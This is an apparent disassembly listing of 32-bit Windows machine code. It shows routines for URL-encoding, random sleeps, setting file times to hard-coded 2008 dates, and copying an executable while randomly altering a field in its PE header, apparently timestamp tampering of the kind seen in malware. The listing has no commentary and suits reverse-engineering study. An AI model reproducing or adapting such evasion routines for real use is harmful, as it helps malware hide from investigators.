  4070bb:	ff 15 c4 e0 40 00    	call   *0x40e0c4
  4070c1:	83 0f 04             	orl    $0x4,(%edi)
  4070c4:	eb 7d                	jmp    0x407143
  4070c6:	53                   	push   %ebx
  4070c7:	53                   	push   %ebx
  4070c8:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4070cb:	50                   	push   %eax
  4070cc:	56                   	push   %esi
  4070cd:	ff 15 98 e1 40 00    	call   *0x40e198
  4070d3:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4070d6:	50                   	push   %eax
  4070d7:	bf 00 08 00 00       	mov    $0x800,%edi
  4070dc:	57                   	push   %edi
  4070dd:	8d 85 e8 f7 ff ff    	lea    -0x818(%ebp),%eax
  4070e3:	50                   	push   %eax
  4070e4:	56                   	push   %esi
  4070e5:	8b 35 8c e1 40 00    	mov    0x40e18c,%esi
  4070eb:	eb 2c                	jmp    0x407119
  4070ed:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4070f0:	74 31                	je     0x407123
  4070f2:	53                   	push   %ebx
  4070f3:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4070f6:	50                   	push   %eax
  4070f7:	ff 75 f8             	push   -0x8(%ebp)
  4070fa:	8d 85 e8 f7 ff ff    	lea    -0x818(%ebp),%eax
  407100:	50                   	push   %eax
  407101:	ff 75 fc             	push   -0x4(%ebp)
  407104:	ff 15 ec e0 40 00    	call   *0x40e0ec
  40710a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40710d:	50                   	push   %eax
  40710e:	57                   	push   %edi
  40710f:	8d 85 e8 f7 ff ff    	lea    -0x818(%ebp),%eax
  407115:	50                   	push   %eax
  407116:	ff 75 f0             	push   -0x10(%ebp)
  407119:	ff d6                	call   *%esi
  40711b:	83 f8 01             	cmp    $0x1,%eax
  40711e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407121:	74 ca                	je     0x4070ed
  407123:	ff 75 fc             	push   -0x4(%ebp)
  407126:	ff 15 c4 e0 40 00    	call   *0x40e0c4
  40712c:	ff 75 f0             	push   -0x10(%ebp)
  40712f:	ff 15 94 e1 40 00    	call   *0x40e194
  407135:	33 c0                	xor    %eax,%eax
  407137:	40                   	inc    %eax
  407138:	39 45 f4             	cmp    %eax,-0xc(%ebp)
  40713b:	74 08                	je     0x407145
  40713d:	8b 45 14             	mov    0x14(%ebp),%eax
  407140:	83 08 04             	orl    $0x4,(%eax)
  407143:	33 c0                	xor    %eax,%eax
  407145:	5e                   	pop    %esi
  407146:	5f                   	pop    %edi
  407147:	5b                   	pop    %ebx
  407148:	c9                   	leave
  407149:	c3                   	ret
  40714a:	56                   	push   %esi
  40714b:	57                   	push   %edi
  40714c:	33 f6                	xor    %esi,%esi
  40714e:	e8 fe e2 ff ff       	call   0x405451
  407153:	85 c0                	test   %eax,%eax
  407155:	59                   	pop    %ecx
  407156:	0f 86 8b 00 00 00    	jbe    0x4071e7
  40715c:	53                   	push   %ebx
  40715d:	0f b7 04 77          	movzwl (%edi,%esi,2),%eax
  407161:	66 3d ff 00          	cmp    $0xff,%ax
  407165:	0f 87 82 00 00 00    	ja     0x4071ed
  40716b:	66 3d 61 00          	cmp    $0x61,%ax
  40716f:	72 06                	jb     0x407177
  407171:	66 3d 7a 00          	cmp    $0x7a,%ax
  407175:	76 76                	jbe    0x4071ed
  407177:	66 3d 41 00          	cmp    $0x41,%ax
  40717b:	72 06                	jb     0x407183
  40717d:	66 3d 5a 00          	cmp    $0x5a,%ax
  407181:	76 6a                	jbe    0x4071ed
  407183:	66 3d 30 00          	cmp    $0x30,%ax
  407187:	72 06                	jb     0x40718f
  407189:	66 3d 39 00          	cmp    $0x39,%ax
  40718d:	76 5e                	jbe    0x4071ed
  40718f:	66 3d 20 00          	cmp    $0x20,%ax
  407193:	74 5e                	je     0x4071f3
  407195:	66 3d 2e 00          	cmp    $0x2e,%ax
  407199:	74 52                	je     0x4071ed
  40719b:	0f b6 04 77          	movzbl (%edi,%esi,2),%eax
  40719f:	8b c8                	mov    %eax,%ecx
  4071a1:	c1 e9 04             	shr    $0x4,%ecx
  4071a4:	8b d9                	mov    %ecx,%ebx
  4071a6:	c1 e3 04             	shl    $0x4,%ebx
  4071a9:	2b c3                	sub    %ebx,%eax
  4071ab:	83 f9 09             	cmp    $0x9,%ecx
  4071ae:	76 05                	jbe    0x4071b5
  4071b0:	83 c1 37             	add    $0x37,%ecx
  4071b3:	eb 03                	jmp    0x4071b8
  4071b5:	83 c1 30             	add    $0x30,%ecx
  4071b8:	83 f8 09             	cmp    $0x9,%eax
  4071bb:	76 05                	jbe    0x4071c2
  4071bd:	83 c0 37             	add    $0x37,%eax
  4071c0:	eb 03                	jmp    0x4071c5
  4071c2:	83 c0 30             	add    $0x30,%eax
  4071c5:	66 c7 02 25 00       	movw   $0x25,(%edx)
  4071ca:	42                   	inc    %edx
  4071cb:	42                   	inc    %edx
  4071cc:	66 89 0a             	mov    %cx,(%edx)
  4071cf:	42                   	inc    %edx
  4071d0:	42                   	inc    %edx
  4071d1:	66 89 02             	mov    %ax,(%edx)
  4071d4:	42                   	inc    %edx
  4071d5:	42                   	inc    %edx
  4071d6:	57                   	push   %edi
  4071d7:	46                   	inc    %esi
  4071d8:	e8 74 e2 ff ff       	call   0x405451
  4071dd:	3b f0                	cmp    %eax,%esi
  4071df:	59                   	pop    %ecx
  4071e0:	0f 82 77 ff ff ff    	jb     0x40715d
  4071e6:	5b                   	pop    %ebx
  4071e7:	66 83 22 00          	andw   $0x0,(%edx)
  4071eb:	5e                   	pop    %esi
  4071ec:	c3                   	ret
  4071ed:	66 3d 20 00          	cmp    $0x20,%ax
  4071f1:	75 de                	jne    0x4071d1
  4071f3:	66 c7 02 2b 00       	movw   $0x2b,(%edx)
  4071f8:	eb da                	jmp    0x4071d4
  4071fa:	56                   	push   %esi
  4071fb:	57                   	push   %edi
  4071fc:	33 f6                	xor    %esi,%esi
  4071fe:	e8 4e e2 ff ff       	call   0x405451
  407203:	85 c0                	test   %eax,%eax
  407205:	59                   	pop    %ecx
  407206:	76 29                	jbe    0x407231
  407208:	0f b7 04 77          	movzwl (%edi,%esi,2),%eax
  40720c:	66 3d 26 00          	cmp    $0x26,%ax
  407210:	74 05                	je     0x407217
  407212:	66 89 02             	mov    %ax,(%edx)
  407215:	eb 0c                	jmp    0x407223
  407217:	66 c7 02 5e 00       	movw   $0x5e,(%edx)
  40721c:	42                   	inc    %edx
  40721d:	42                   	inc    %edx
  40721e:	66 c7 02 5e 00       	movw   $0x5e,(%edx)
  407223:	42                   	inc    %edx
  407224:	42                   	inc    %edx
  407225:	57                   	push   %edi
  407226:	46                   	inc    %esi
  407227:	e8 25 e2 ff ff       	call   0x405451
  40722c:	3b f0                	cmp    %eax,%esi
  40722e:	59                   	pop    %ecx
  40722f:	72 d7                	jb     0x407208
  407231:	66 83 22 00          	andw   $0x0,(%edx)
  407235:	5e                   	pop    %esi
  407236:	c3                   	ret
  407237:	56                   	push   %esi
  407238:	66 c7 00 30 00       	movw   $0x30,(%eax)
  40723d:	57                   	push   %edi
  40723e:	40                   	inc    %eax
  40723f:	40                   	inc    %eax
  407240:	6a 10                	push   $0x10
  407242:	66 c7 00 2e 00       	movw   $0x2e,(%eax)
  407247:	8d 48 02             	lea    0x2(%eax),%ecx
  40724a:	5e                   	pop    %esi
  40724b:	e8 fd e5 ff ff       	call   0x40584d
  407250:	6a 0a                	push   $0xa
  407252:	99                   	cltd
  407253:	5f                   	pop    %edi
  407254:	f7 ff                	idiv   %edi
  407256:	83 c2 30             	add    $0x30,%edx
  407259:	66 89 11             	mov    %dx,(%ecx)
  40725c:	41                   	inc    %ecx
  40725d:	41                   	inc    %ecx
  40725e:	4e                   	dec    %esi
  40725f:	75 ea                	jne    0x40724b
  407261:	66 21 31             	and    %si,(%ecx)
  407264:	5f                   	pop    %edi
  407265:	5e                   	pop    %esi
  407266:	c3                   	ret
  407267:	55                   	push   %ebp
  407268:	8b ec                	mov    %esp,%ebp
  40726a:	83 ec 34             	sub    $0x34,%esp
  40726d:	53                   	push   %ebx
  40726e:	56                   	push   %esi
  40726f:	8b f0                	mov    %eax,%esi
  407271:	33 db                	xor    %ebx,%ebx
  407273:	3b f3                	cmp    %ebx,%esi
  407275:	57                   	push   %edi
  407276:	75 0c                	jne    0x407284
  407278:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40727b:	50                   	push   %eax
  40727c:	ff 15 e0 e0 40 00    	call   *0x40e0e0
  407282:	eb 07                	jmp    0x40728b
  407284:	8d 7d d0             	lea    -0x30(%ebp),%edi
  407287:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407288:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407289:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40728a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40728b:	8b 35 9c e0 40 00    	mov    0x40e09c,%esi
  407291:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407294:	50                   	push   %eax
  407295:	8d 45 d0             	lea    -0x30(%ebp),%eax
  407298:	50                   	push   %eax
  407299:	66 c7 45 e0 b2 07    	movw   $0x7b2,-0x20(%ebp)
  40729f:	66 c7 45 e2 01 00    	movw   $0x1,-0x1e(%ebp)
  4072a5:	66 c7 45 e6 01 00    	movw   $0x1,-0x1a(%ebp)
  4072ab:	66 89 5d e8          	mov    %bx,-0x18(%ebp)
  4072af:	66 89 5d ea          	mov    %bx,-0x16(%ebp)
  4072b3:	66 c7 45 ec 01 00    	movw   $0x1,-0x14(%ebp)
  4072b9:	66 89 5d e4          	mov    %bx,-0x1c(%ebp)
  4072bd:	66 89 5d ee          	mov    %bx,-0x12(%ebp)
  4072c1:	ff d6                	call   *%esi
  4072c3:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4072c6:	50                   	push   %eax
  4072c7:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4072ca:	50                   	push   %eax
  4072cb:	ff d6                	call   *%esi
  4072cd:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4072d0:	2b 4d f0             	sub    -0x10(%ebp),%ecx
  4072d3:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4072d6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4072d9:	53                   	push   %ebx
  4072da:	68 80 96 98 00       	push   $0x989680
  4072df:	1b c2                	sbb    %edx,%eax
  4072e1:	50                   	push   %eax
  4072e2:	51                   	push   %ecx
  4072e3:	e8 98 61 00 00       	call   0x40d480
  4072e8:	5f                   	pop    %edi
  4072e9:	5e                   	pop    %esi
  4072ea:	5b                   	pop    %ebx
  4072eb:	c9                   	leave
  4072ec:	c3                   	ret
  4072ed:	55                   	push   %ebp
  4072ee:	8b ec                	mov    %esp,%ebp
  4072f0:	83 ec 30             	sub    $0x30,%esp
  4072f3:	56                   	push   %esi
  4072f4:	57                   	push   %edi
  4072f5:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4072f8:	50                   	push   %eax
  4072f9:	ff 15 e0 e0 40 00    	call   *0x40e0e0
  4072ff:	8b 35 9c e0 40 00    	mov    0x40e09c,%esi
  407305:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407308:	50                   	push   %eax
  407309:	33 ff                	xor    %edi,%edi
  40730b:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40730e:	50                   	push   %eax
  40730f:	66 c7 45 e0 b2 07    	movw   $0x7b2,-0x20(%ebp)
  407315:	66 c7 45 e2 01 00    	movw   $0x1,-0x1e(%ebp)
  40731b:	66 c7 45 e6 01 00    	movw   $0x1,-0x1a(%ebp)
  407321:	66 89 7d e8          	mov    %di,-0x18(%ebp)
  407325:	66 89 7d ea          	mov    %di,-0x16(%ebp)
  407329:	66 c7 45 ec 01 00    	movw   $0x1,-0x14(%ebp)
  40732f:	66 89 7d e4          	mov    %di,-0x1c(%ebp)
  407333:	66 89 7d ee          	mov    %di,-0x12(%ebp)
  407337:	ff d6                	call   *%esi
  407339:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40733c:	50                   	push   %eax
  40733d:	8d 45 e0             	lea    -0x20(%ebp),%eax
  407340:	50                   	push   %eax
  407341:	ff d6                	call   *%esi
  407343:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  407346:	2b 4d f0             	sub    -0x10(%ebp),%ecx
  407349:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40734c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40734f:	57                   	push   %edi
  407350:	68 10 27 00 00       	push   $0x2710
  407355:	1b c2                	sbb    %edx,%eax
  407357:	50                   	push   %eax
  407358:	51                   	push   %ecx
  407359:	e8 22 61 00 00       	call   0x40d480
  40735e:	5f                   	pop    %edi
  40735f:	5e                   	pop    %esi
  407360:	c9                   	leave
  407361:	c3                   	ret
  407362:	55                   	push   %ebp
  407363:	8b ec                	mov    %esp,%ebp
  407365:	81 ec f4 00 00 00    	sub    $0xf4,%esp
  40736b:	53                   	push   %ebx
  40736c:	56                   	push   %esi
  40736d:	57                   	push   %edi
  40736e:	33 ff                	xor    %edi,%edi
  407370:	57                   	push   %edi
  407371:	6a 01                	push   $0x1
  407373:	57                   	push   %edi
  407374:	ff 15 a0 e0 40 00    	call   *0x40e0a0
  40737a:	8b 35 f0 e0 40 00    	mov    0x40e0f0,%esi
  407380:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407383:	8d 45 dc             	lea    -0x24(%ebp),%eax
  407386:	50                   	push   %eax
  407387:	ff d6                	call   *%esi
  407389:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40738c:	50                   	push   %eax
  40738d:	ff d6                	call   *%esi
  40738f:	8d 85 10 ff ff ff    	lea    -0xf0(%ebp),%eax
  407395:	50                   	push   %eax
  407396:	66 c7 45 ec d8 07    	movw   $0x7d8,-0x14(%ebp)
  40739c:	66 c7 45 dc d8 07    	movw   $0x7d8,-0x24(%ebp)
  4073a2:	66 c7 45 ee 06 00    	movw   $0x6,-0x12(%ebp)
  4073a8:	66 c7 45 de 06 00    	movw   $0x6,-0x22(%ebp)
  4073ae:	66 c7 45 f2 0a 00    	movw   $0xa,-0xe(%ebp)
  4073b4:	66 c7 45 e2 0b 00    	movw   $0xb,-0x1e(%ebp)
  4073ba:	66 89 7d e6          	mov    %di,-0x1a(%ebp)
  4073be:	66 89 7d e4          	mov    %di,-0x1c(%ebp)
  4073c2:	ff 15 bc e0 40 00    	call   *0x40e0bc
  4073c8:	8b 85 10 ff ff ff    	mov    -0xf0(%ebp),%eax
  4073ce:	05 b4 00 00 00       	add    $0xb4,%eax
  4073d3:	6a 3c                	push   $0x3c
  4073d5:	99                   	cltd
  4073d6:	59                   	pop    %ecx
  4073d7:	f7 f9                	idiv   %ecx
  4073d9:	3b c7                	cmp    %edi,%eax
  4073db:	7c 14                	jl     0x4073f1
  4073dd:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4073e0:	03 c1                	add    %ecx,%eax
  4073e2:	0f b7 c0             	movzwl %ax,%eax
  4073e5:	6a 18                	push   $0x18
  4073e7:	99                   	cltd
  4073e8:	59                   	pop    %ecx
  4073e9:	f7 f9                	idiv   %ecx
  4073eb:	66 89 55 f4          	mov    %dx,-0xc(%ebp)
  4073ef:	eb 13                	jmp    0x407404
  4073f1:	0f b7 4d f4          	movzwl -0xc(%ebp),%ecx
  4073f5:	f7 d8                	neg    %eax
  4073f7:	3b c8                	cmp    %eax,%ecx
  4073f9:	7d 05                	jge    0x407400
  4073fb:	66 83 45 f4 18       	addw   $0x18,-0xc(%ebp)
  407400:	66 29 45 f4          	sub    %ax,-0xc(%ebp)
  407404:	8b 35 9c e0 40 00    	mov    0x40e09c,%esi
  40740a:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40740d:	50                   	push   %eax
  40740e:	8d 45 ec             	lea    -0x14(%ebp),%eax
  407411:	50                   	push   %eax
  407412:	ff d6                	call   *%esi
  407414:	8d 45 c0             	lea    -0x40(%ebp),%eax
  407417:	50                   	push   %eax
  407418:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40741b:	50                   	push   %eax
  40741c:	ff d6                	call   *%esi
  40741e:	0f b7 45 fa          	movzwl -0x6(%ebp),%eax
  407422:	8b 75 cc             	mov    -0x34(%ebp),%esi
  407425:	8b 7d c8             	mov    -0x38(%ebp),%edi
  407428:	a3 e0 14 41 00       	mov    %eax,0x4114e0
  40742d:	e8 1b e4 ff ff       	call   0x40584d
  407432:	99                   	cltd
  407433:	6a 32                	push   $0x32
  407435:	59                   	pop    %ecx
  407436:	f7 f9                	idiv   %ecx
  407438:	8b ca                	mov    %edx,%ecx
  40743a:	83 c1 0f             	add    $0xf,%ecx
  40743d:	6b c9 3c             	imul   $0x3c,%ecx,%ecx
  407440:	e8 08 e4 ff ff       	call   0x40584d
  407445:	6a 3c                	push   $0x3c
  407447:	5b                   	pop    %ebx
  407448:	99                   	cltd
  407449:	f7 fb                	idiv   %ebx
  40744b:	8b c1                	mov    %ecx,%eax
  40744d:	33 db                	xor    %ebx,%ebx
  40744f:	53                   	push   %ebx
  407450:	68 80 96 98 00       	push   $0x989680
  407455:	2b c2                	sub    %edx,%eax
  407457:	99                   	cltd
  407458:	52                   	push   %edx
  407459:	50                   	push   %eax
  40745a:	e8 91 60 00 00       	call   0x40d4f0
  40745f:	53                   	push   %ebx
  407460:	53                   	push   %ebx
  407461:	2b f8                	sub    %eax,%edi
  407463:	53                   	push   %ebx
  407464:	1b f2                	sbb    %edx,%esi
  407466:	2b 7d c0             	sub    -0x40(%ebp),%edi
  407469:	53                   	push   %ebx
  40746a:	1b 75 c4             	sbb    -0x3c(%ebp),%esi
  40746d:	8d 45 d0             	lea    -0x30(%ebp),%eax
  407470:	50                   	push   %eax
  407471:	ff 75 fc             	push   -0x4(%ebp)
  407474:	89 7d d0             	mov    %edi,-0x30(%ebp)
  407477:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  40747a:	ff 15 98 e0 40 00    	call   *0x40e098
  407480:	6a ff                	push   $0xffffffff
  407482:	ff 75 fc             	push   -0x4(%ebp)
  407485:	ff 15 b8 e0 40 00    	call   *0x40e0b8
  40748b:	ff 75 fc             	push   -0x4(%ebp)
  40748e:	ff 15 c4 e0 40 00    	call   *0x40e0c4
  407494:	5f                   	pop    %edi
  407495:	5e                   	pop    %esi
  407496:	5b                   	pop    %ebx
  407497:	c9                   	leave
  407498:	c3                   	ret
  407499:	55                   	push   %ebp
  40749a:	8b ec                	mov    %esp,%ebp
  40749c:	81 ec dc 00 00 00    	sub    $0xdc,%esp
  4074a2:	56                   	push   %esi
  4074a3:	8b 35 f0 e0 40 00    	mov    0x40e0f0,%esi
  4074a9:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4074ac:	50                   	push   %eax
  4074ad:	ff d6                	call   *%esi
  4074af:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4074b2:	50                   	push   %eax
  4074b3:	ff d6                	call   *%esi
  4074b5:	66 83 65 ea 00       	andw   $0x0,-0x16(%ebp)
  4074ba:	66 83 65 e8 00       	andw   $0x0,-0x18(%ebp)
  4074bf:	8d 85 24 ff ff ff    	lea    -0xdc(%ebp),%eax
  4074c5:	50                   	push   %eax
  4074c6:	66 c7 45 f0 d8 07    	movw   $0x7d8,-0x10(%ebp)
  4074cc:	66 c7 45 e0 d8 07    	movw   $0x7d8,-0x20(%ebp)
  4074d2:	66 c7 45 f2 06 00    	movw   $0x6,-0xe(%ebp)
  4074d8:	66 c7 45 e2 06 00    	movw   $0x6,-0x1e(%ebp)
  4074de:	66 c7 45 f6 0a 00    	movw   $0xa,-0xa(%ebp)
  4074e4:	66 c7 45 e6 0b 00    	movw   $0xb,-0x1a(%ebp)
  4074ea:	ff 15 bc e0 40 00    	call   *0x40e0bc
  4074f0:	8b 85 24 ff ff ff    	mov    -0xdc(%ebp),%eax
  4074f6:	05 b4 00 00 00       	add    $0xb4,%eax
  4074fb:	0f b7 c0             	movzwl %ax,%eax
  4074fe:	99                   	cltd
  4074ff:	6a 3c                	push   $0x3c
  407501:	59                   	pop    %ecx
  407502:	f7 f9                	idiv   %ecx
  407504:	0f b7 4d f8          	movzwl -0x8(%ebp),%ecx
  407508:	6a 18                	push   $0x18
  40750a:	8b 35 9c e0 40 00    	mov    0x40e09c,%esi
  407510:	0f b7 c0             	movzwl %ax,%eax
  407513:	03 c1                	add    %ecx,%eax
  407515:	99                   	cltd
  407516:	59                   	pop    %ecx
  407517:	f7 f9                	idiv   %ecx
  407519:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40751c:	50                   	push   %eax
  40751d:	8d 45 f0             	lea    -0x10(%ebp),%eax
  407520:	50                   	push   %eax
  407521:	66 89 55 f8          	mov    %dx,-0x8(%ebp)
  407525:	ff d6                	call   *%esi
  407527:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40752a:	50                   	push   %eax
  40752b:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40752e:	50                   	push   %eax
  40752f:	ff d6                	call   *%esi
  407531:	8b 75 d8             	mov    -0x28(%ebp),%esi
  407534:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  407537:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40753a:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40753d:	6a 00                	push   $0x0
  40753f:	2b ce                	sub    %esi,%ecx
  407541:	68 80 96 98 00       	push   $0x989680
  407546:	1b c2                	sbb    %edx,%eax
  407548:	50                   	push   %eax
  407549:	51                   	push   %ecx
  40754a:	e8 81 5e 00 00       	call   0x40d3d0
  40754f:	5e                   	pop    %esi
  407550:	c9                   	leave
  407551:	c3                   	ret
  407552:	e8 f6 e2 ff ff       	call   0x40584d
  407557:	0f b6 c9             	movzbl %cl,%ecx
  40755a:	99                   	cltd
  40755b:	41                   	inc    %ecx
  40755c:	f7 f9                	idiv   %ecx
  40755e:	0f b6 44 24 04       	movzbl 0x4(%esp),%eax
  407563:	03 d0                	add    %eax,%edx
  407565:	69 d2 e8 03 00 00    	imul   $0x3e8,%edx,%edx
  40756b:	52                   	push   %edx
  40756c:	ff 15 70 e0 40 00    	call   *0x40e070
  407572:	c3                   	ret
  407573:	55                   	push   %ebp
  407574:	8b ec                	mov    %esp,%ebp
  407576:	51                   	push   %ecx
  407577:	56                   	push   %esi
  407578:	8b f0                	mov    %eax,%esi
  40757a:	33 c9                	xor    %ecx,%ecx
  40757c:	3b f3                	cmp    %ebx,%esi
  40757e:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  407581:	7f 03                	jg     0x407586
  407583:	89 75 fc             	mov    %esi,-0x4(%ebp)
  407586:	33 c0                	xor    %eax,%eax
  407588:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  40758b:	7e 0d                	jle    0x40759a
  40758d:	03 0c 87             	add    (%edi,%eax,4),%ecx
  407590:	40                   	inc    %eax
  407591:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  407594:	7c f7                	jl     0x40758d
  407596:	85 c9                	test   %ecx,%ecx
  407598:	75 04                	jne    0x40759e
  40759a:	33 c0                	xor    %eax,%eax
  40759c:	eb 33                	jmp    0x4075d1
  40759e:	e8 aa e2 ff ff       	call   0x40584d
  4075a3:	99                   	cltd
  4075a4:	f7 f9                	idiv   %ecx
  4075a6:	33 c9                	xor    %ecx,%ecx
  4075a8:	33 c0                	xor    %eax,%eax
  4075aa:	03 0c 87             	add    (%edi,%eax,4),%ecx
  4075ad:	3b d1                	cmp    %ecx,%edx
  4075af:	7c 06                	jl     0x4075b7
  4075b1:	40                   	inc    %eax
  4075b2:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  4075b5:	7c f3                	jl     0x4075aa
  4075b7:	3b f3                	cmp    %ebx,%esi
  4075b9:	7c 16                	jl     0x4075d1
  4075bb:	8d 4b ff             	lea    -0x1(%ebx),%ecx
  4075be:	3b c1                	cmp    %ecx,%eax
  4075c0:	75 0f                	jne    0x4075d1
  4075c2:	e8 86 e2 ff ff       	call   0x40584d
  4075c7:	2b f3                	sub    %ebx,%esi
  4075c9:	99                   	cltd
  4075ca:	46                   	inc    %esi
  4075cb:	f7 fe                	idiv   %esi
  4075cd:	8d 44 1a ff          	lea    -0x1(%edx,%ebx,1),%eax
  4075d1:	5e                   	pop    %esi
  4075d2:	c9                   	leave
  4075d3:	c3                   	ret
  4075d4:	55                   	push   %ebp
  4075d5:	8b ec                	mov    %esp,%ebp
  4075d7:	81 ec 48 01 00 00    	sub    $0x148,%esp
  4075dd:	53                   	push   %ebx
  4075de:	8b 1d c0 e0 40 00    	mov    0x40e0c0,%ebx
  4075e4:	56                   	push   %esi
  4075e5:	57                   	push   %edi
  4075e6:	33 f6                	xor    %esi,%esi
  4075e8:	56                   	push   %esi
  4075e9:	bf 80 00 00 00       	mov    $0x80,%edi
  4075ee:	57                   	push   %edi
  4075ef:	6a 03                	push   $0x3
  4075f1:	56                   	push   %esi
  4075f2:	6a 01                	push   $0x1
  4075f4:	68 00 00 00 80       	push   $0x80000000
  4075f9:	ff 75 08             	push   0x8(%ebp)
  4075fc:	ff d3                	call   *%ebx
  4075fe:	83 f8 ff             	cmp    $0xffffffff,%eax
  407601:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407604:	0f 84 15 01 00 00    	je     0x40771f
  40760a:	56                   	push   %esi
  40760b:	57                   	push   %edi
  40760c:	6a 02                	push   $0x2
  40760e:	56                   	push   %esi
  40760f:	56                   	push   %esi
  407610:	68 00 00 00 c0       	push   $0xc0000000
  407615:	ff 75 0c             	push   0xc(%ebp)
  407618:	ff d3                	call   *%ebx
  40761a:	83 f8 ff             	cmp    $0xffffffff,%eax
  40761d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407620:	75 08                	jne    0x40762a
  407622:	6a 02                	push   $0x2
  407624:	58                   	pop    %eax
  407625:	e9 f8 00 00 00       	jmp    0x407722
  40762a:	56                   	push   %esi
  40762b:	ff 75 f4             	push   -0xc(%ebp)
  40762e:	ff 15 e4 e0 40 00    	call   *0x40e0e4
  407634:	8b f8                	mov    %eax,%edi
  407636:	57                   	push   %edi
  407637:	56                   	push   %esi
  407638:	ff 15 d0 e0 40 00    	call   *0x40e0d0
  40763e:	50                   	push   %eax
  40763f:	ff 15 94 e0 40 00    	call   *0x40e094
  407645:	3b c6                	cmp    %esi,%eax
  407647:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40764a:	0f 84 cf 00 00 00    	je     0x40771f
  407650:	8b 1d ac e0 40 00    	mov    0x40e0ac,%ebx
  407656:	56                   	push   %esi
  407657:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  40765a:	51                   	push   %ecx
  40765b:	57                   	push   %edi
  40765c:	50                   	push   %eax
  40765d:	ff 75 f4             	push   -0xc(%ebp)
  407660:	ff d3                	call   *%ebx
  407662:	85 c0                	test   %eax,%eax
  407664:	0f 84 b5 00 00 00    	je     0x40771f
  40766a:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  40766d:	0f 85 ac 00 00 00    	jne    0x40771f
  407673:	56                   	push   %esi
  407674:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407677:	50                   	push   %eax
  407678:	57                   	push   %edi
  407679:	ff 75 f0             	push   -0x10(%ebp)
  40767c:	ff 75 fc             	push   -0x4(%ebp)
  40767f:	ff 15 ec e0 40 00    	call   *0x40e0ec
  407685:	8b 3d 88 e0 40 00    	mov    0x40e088,%edi
  40768b:	56                   	push   %esi
  40768c:	56                   	push   %esi
  40768d:	56                   	push   %esi
  40768e:	ff 75 fc             	push   -0x4(%ebp)
  407691:	ff d7                	call   *%edi
  407693:	56                   	push   %esi
  407694:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407697:	50                   	push   %eax
  407698:	6a 40                	push   $0x40
  40769a:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40769d:	50                   	push   %eax
  40769e:	ff 75 fc             	push   -0x4(%ebp)
  4076a1:	ff d3                	call   *%ebx
  4076a3:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4076a6:	56                   	push   %esi
  4076a7:	56                   	push   %esi
  4076a8:	50                   	push   %eax
  4076a9:	ff 75 fc             	push   -0x4(%ebp)
  4076ac:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4076af:	ff d7                	call   *%edi
  4076b1:	56                   	push   %esi
  4076b2:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4076b5:	50                   	push   %eax
  4076b6:	68 f8 00 00 00       	push   $0xf8
  4076bb:	8d 85 b8 fe ff ff    	lea    -0x148(%ebp),%eax
  4076c1:	50                   	push   %eax
  4076c2:	ff 75 fc             	push   -0x4(%ebp)
  4076c5:	ff d3                	call   *%ebx
  4076c7:	e8 81 e1 ff ff       	call   0x40584d
  4076cc:	99                   	cltd
  4076cd:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
  4076d2:	f7 f9                	idiv   %ecx
  4076d4:	8b 85 c0 fe ff ff    	mov    -0x140(%ebp),%eax
  4076da:	56                   	push   %esi
  4076db:	56                   	push   %esi
  4076dc:	ff 75 f0             	push   -0x10(%ebp)
  4076df:	ff 75 fc             	push   -0x4(%ebp)
  4076e2:	8d 84 10 0c fe ff ff 	lea    -0x1f4(%eax,%edx,1),%eax
  4076e9:	89 85 c0 fe ff ff    	mov    %eax,-0x140(%ebp)
  4076ef:	ff d7                	call   *%edi
  4076f1:	56                   	push   %esi
  4076f2:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4076f5:	50                   	push   %eax
  4076f6:	68 f8 00 00 00       	push   $0xf8
  4076fb:	8d 85 b8 fe ff ff    	lea    -0x148(%ebp),%eax
  407701:	50                   	push   %eax
  407702:	ff 75 fc             	push   -0x4(%ebp)
  407705:	ff 15 ec e0 40 00    	call   *0x40e0ec
